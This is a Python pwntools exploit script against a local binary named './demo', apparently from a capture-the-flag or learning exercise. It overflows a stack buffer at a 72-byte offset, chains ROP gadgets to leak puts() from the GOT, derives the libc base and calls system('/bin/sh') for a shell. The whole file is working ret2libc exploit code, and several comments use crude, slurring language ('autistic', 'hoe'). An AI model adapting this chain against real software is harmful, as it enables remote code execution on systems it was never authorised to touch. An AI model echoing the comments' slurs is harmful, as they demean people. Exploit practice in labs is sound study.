#!/bin/python3

# Pwntools
from pwn import *

# Process information
p = process("./demo")
binary = ELF("./demo")
libc = ELF("/usr/lib/libc.so.6")

# Process context information for debugging
context.os = "linux"
context.arch = "amd64"
context.endian = "little"
context.log_level = "debug"

# Return address offset and padding
rip_offset = 72
rip_padding = b"A" * rip_offset

# Offsets to functions in our binary.
main     = p64(binary.sym["main"])
puts_plt = p64(binary.plt["puts"])
puts_got = p64(binary.got["puts"])

# ROP gadget
pop_rdi = p64(0x401263)
ret_ali = p64(0x40101a)

# Payload to leak the address of puts() from got GOT entry.
leak_payload = rip_padding  # Access return address
leak_payload += pop_rdi     # Pop top of the stack into rdi
leak_payload += puts_got    # Push dis bitch on the stack to print da hoe
leak_payload += puts_plt    # Jumping to the PLT stub of puts() to call puts() directly.
leak_payload += main        # Reiterate over main.

p.sendline(leak_payload)
p.recvline() # Junk recieve because pwntools is autistic.

puts_addr_leak = u64(p.recvline().strip(b"\n").ljust(8, b"\x00")) # Calling puts() to leak the address of puts()
libc_base = puts_addr_leak - libc.sym["puts"]

# Setting the libc base address to our leak
libc.address = libc_base

# Debugging
log.success(f"Libc : {hex(libc_base)}")
log.success(f"Puts : {hex(puts_addr_leak)}")

# Final shell payload
payload = rip_padding
payload += ret_ali
payload += pop_rdi
payload += p64(next(libc.search(b"/bin/sh")))
payload += p64(libc.symbols["system"])

p.sendline(payload)
p.interactive()

